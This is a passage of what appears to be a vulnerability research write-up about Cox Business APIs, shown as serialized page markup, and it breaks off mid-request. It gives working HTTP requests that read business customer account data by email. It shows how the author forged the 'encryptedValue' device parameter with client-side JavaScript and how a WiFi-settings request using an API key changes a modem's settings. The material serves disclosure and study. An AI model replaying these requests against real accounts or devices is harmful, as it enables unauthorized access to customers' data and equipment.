\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"1\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"portType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"CHDDVRX1\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"qualityAssuranceDate\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"20131108\\\"\"}],\",\\n          \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serviceCategoryDescription\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Cable\\\"\"}],\"\\n        }\\n      ],\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"serialNumber\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"SACDRVKQN\\\"\"}],\"\\n    }\\n  ]\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"It worked! My connected equipment was returned in the HTTP response.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"accessing-and-updating-any-cox-business-customer-account\",\"children\":\"Accessing and Updating any Cox Business Customer Account\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"To test if this could be abused to access and modify business customer accounts, I found an API request which could query customers via email. I sent the following HTTP request and saw the following response:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"GET\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/user/services/user/admin@cox.net\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"OK\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"id\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"admin@cox.net\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"guid\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"89d6db21-402d-4a57-a87b-cad85d01b192\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"email\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"admin@cox.net\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"firstName\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Redacted\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"lastName\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Redacted\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"primaryPhone\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Redacted\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"status\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"INACTIVE\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"type\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"RETAIL\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileAdmin\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-literal\",\"children\":\"true\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"profileOwner\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-literal\",\"children\":\"true\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"isCpniSetupRequired\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-literal\",\"children\":\"false\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"isPasswordChangeRequired\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-literal\",\"children\":\"true\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"timeZone\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"EST\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"userType\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"PROFILE_OWNER\\\"\"}],\",\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"userProfileDetails\\\":\"}],\" {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"id\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"{3DES}JA1+doxmDYc=\\\"\"}],\",\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"guid\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"9795bd4c-92d6-4aa2-ad30-1da4bbcbe1da\\\"\"}],\",\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"name\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Supreme Carpet Care\\\"\"}],\",\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"status\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"ACTIVE\\\"\"}],\",\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"ownerEmail\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"admin@cox.net\\\"\"}],\"\\n  },\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"contactType\\\":\"}],\" {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"contactInfo\\\":\"}],\" [\\n      {\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"type\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"alternateEmail\\\"\"}],\",\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"value\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"redacted@redacted.com\\\"\"}],\"\\n      }\\n    ]\\n  },\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"preferredEmail\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"admin@cox.net\\\"\"}],\"\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Another similar POST account update request worked. This confirmed we could read and write to business accounts.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"At this point, I'd demonstrated that it was possible to (1) search a customer and retrieve their business account PII using only their name, then (2) retrieve the MAC addresses of the connected hardware on their account, then (3) run commands against the MAC address via the API. It was time to find some API endpoints that actually wrote to the device to simulate an attacker attempting to get code execution.\"}],\"\\n\",[\"$\",\"h3\",null,{\"id\":\"overwriting-anyones-device-settings-via-leaked-cryptographic-secret\",\"children\":\"Overwriting Anyone's Device Settings via Leaked Cryptographic Secret\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Looking through the swagger docs, it seemed that every hardware modification requests (e.g. update device password) required a parameter called \",[\"$\",\"code\",null,{\"children\":\"encryptedValue\",\"className\":\"__className_8a4d12\"}],\". If I could find a way to generate this value, then I could demonstrate write access to modems which would lead to remote code execution.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"To know if I could even generate this \",[\"$\",\"code\",null,{\"children\":\"encryptedValue\",\"className\":\"__className_8a4d12\"}],\" parameter, I had to dig through the original JavaScript to figure out exactly how it was being signed.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/fHIm82Z.png\",\"alt\":\"JS\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"JS\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"After tracing the \",[\"$\",\"code\",null,{\"children\":\"encryptedValue\",\"className\":\"__className_8a4d12\"}],\" parameter back through the JavaScript, I landed on these two functions:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"encryptWithSaltandPadding\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"D\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"const\"}],\" k = n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"AES\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"encrypt\"}],\"(D, \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"this\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"getKey\"}],\"(), {\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"iv\"}],\": n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"enc\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"Hex\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"parse\"}],\"(s.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"IV\"}],\")\\n    }).\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"ciphertext\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"toString\"}],\"(n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"enc\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"Base64\"}],\");\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"btoa\"}],\"(s.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"IV\"}],\" + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"::\\\"\"}],\" + s.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"qs\"}],\" + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"::\\\"\"}],\" + k)\\n}\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"decryptWithSaltandPadding\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"D\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"const\"}],\" W = \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"atob\"}],\"(D),\\n        k = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"this\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"sanitize\"}],\"(W.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"split\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"::\\\"\"}],\")[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"2\"}],\"]),\\n        M = n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"lib\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"CipherParams\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"create\"}],\"({\\n            \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"ciphertext\"}],\": n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"enc\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"Base64\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"parse\"}],\"(k)\\n        });\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"AES\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"decrypt\"}],\"(M, \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"this\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"getKey\"}],\"(), {\\n        \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"iv\"}],\": n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"enc\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"Hex\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"parse\"}],\"(s.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"IV\"}],\")\\n    }).\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"toString\"}],\"(n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"enc\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"Utf8\"}],\")\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Both of these functions took in variables which only existed at runtime, so the easiest way to actually call these functions would be to find somewhere it was called within the actual UI. After searching for a little while, I’d realized that the 4-digit PIN that I set when registering my account was encrypted using the same function!\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/UvElxtP.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"I set a breakpoint at exactly where the \",[\"$\",\"code\",null,{\"children\":\"encryptWithSaltAndPadding\",\"className\":\"__className_8a4d12\"}],\" function was called, then hit enter.\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/jan36pE.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Now that I had a breakpoint set and I was in the correct context for the function I could simply paste the function into my console and run whatever I wanted. To validate that it worked, I copied the encrypted value of the PIN code that was sent in the POST request and passed it to the decrypt function.\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[\"t.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"cbHelper\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"decryptWithSaltandPadding\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjova3paY1orSjRGR0YwWGFvRkhwWHZRPT0=\\\"\"}],\")\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"8042\\\"\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"Perfect! It worked as expected. The only issue now was getting the encrypted value of a device. I asked around for a while until I found a friend who owned a MSP a few states away who used Cox Business. They gave me a login to their account and I saw what appeared to be an \",[\"$\",\"code\",null,{\"children\":\"encryptedValue\",\"className\":\"__className_8a4d12\"}],\" parameter in one of the HTTP responses after authenticating into their account. I copied this value and passed it to the decrypt function once again:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[\"t.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"cbHelper\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"decryptWithSaltandPadding\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"OGEzMjNmNjFhOTk2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpiYk1SNGQybzFLZHhRQ1VQNnF2TWl1QlZ0NEp6WVUyckJGMXF5T0dYTVlaNWdjZkhISTZnUFppdjM3dmtRSUcxclNkMC9WNmV2WFE1eko0VnFZUnFodz09\\\"\"}],\")\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"541051614702\"}],\";\",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"DTC4131\"}],\";\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"333415591\"}],\";\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\";\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"f4\"}],\":\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"c1\"}],\":\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"14\"}],\":\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"70\"}],\":4\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"d\"}],\":ac;\",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"Internet\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Well, that’s annoying. It looked like the encrypted parameter had the MAC address, but also an account ID and a few extra parameters.\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"541051614702\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Cox\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Account\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Number\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"DTC4131\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Device\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Name\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"333415592\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Device\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"ID\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Unknown\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"f4:c1:14:70:4d:ac\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"MAC\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"address\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Internet\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"=\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Label\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"If there was some validation which checked that the MAC address matched the account ID it would make exploiting this somewhat complicated. I investigated further.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"executing-commands-on-any-modem\",\"children\":\"Executing Commands on Any Modem\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"On a leap of faith, I tried signing an “encryptedValue” string with junk data for everything except the MAC address (e.g. \",[\"$\",\"code\",null,{\"children\":\"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING\",\"className\":\"__className_8a4d12\"}],\") to see if it actually validated that the account ID matched the MAC address:\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[\"t.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"cbHelper\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"encryptWithSaltandPadding\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"123456789012;1234567;123456789;1;f4:c1:14:70:4d:ac;ANYTHING\\\"\"}],\")\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-title class_\",\"children\":\"OGEzMjNmNjFhOTk\"}],\"2MGI2OTM0NzAzNTkzODZkOGYxODI6OjhhNzU1NTNlMDAzOTlhNWQ5Zjk5ZTYzMzM3M2RiYWUzOjpLUlArd3Jqek5Ra3VlZUVReXVUWEZHbE91NWVQRzk0WEo1Zi9wSDdVZWxHVkFXYmtWd2Z2YmNHU1FWOVRFT2prZm5tNFhWZlQwNkQ3V2tDU1FqbHpIUT09\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"The only thing in the above parameter that was valid was the device serial number. If this request worked, it meant that I could use an “encryptedValue” parameter in the API that didn’t have to have a matching account ID.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I sent the request and saw the exact same HTTP response as above! This confirmed that we didn’t need any extra parameters, we could just query any hardware device arbitrarily by just knowing the MAC address (something that we could retrieve by querying a customer by name, fetching their account UUID, then fetching all of their connected devices via their UUID). We now had essentially a full kill chain.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I formed the following HTTP request to update my own device MAC addresses SSID as a proof of concept to update my own hardware:\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"POST\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"/api/cbma/accountequipment/services/accountequipment/gatewaydevice/wifisettings\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"HTTP/1.1\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Host:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"myaccount-business.cox.com\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"User-Agent:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Mozilla/5.0\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"(Windows\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"NT\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"10.0\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\";\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Win64;\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"x64;\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"rv:123.0)\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Gecko/20100101\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Firefox/123.0\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Accept:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json,\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"text/plain,\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"*/*\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Clientid:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"cbmauser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Apikey:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"5d228662-aaa1-4a18-be1c-fb84db78cf13\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Cb_session:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"unauthenticateduser\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Authorization:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"Bearer\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"undefined\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Ma_transaction_id:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"56583255\"}],[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"-1cf3-41aa-9600-3d5585152e87\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Connection:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"close\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-Type:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"application/json\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"Content-Length:\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"431\"}],\"\\n\\n{\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"wifiSettings\\\":\"}],\" {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"customerWifiSsid24\\\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Curry\\\"\"}],\"\\n  },\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"additionalProperties\\\":\"}],\" {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"customerWifiSsid24\\\":\"}],\" [\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Curry\\\"\"}],\"\\n    ]\\n  },\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"encryptedValue\\\":\"}],\" 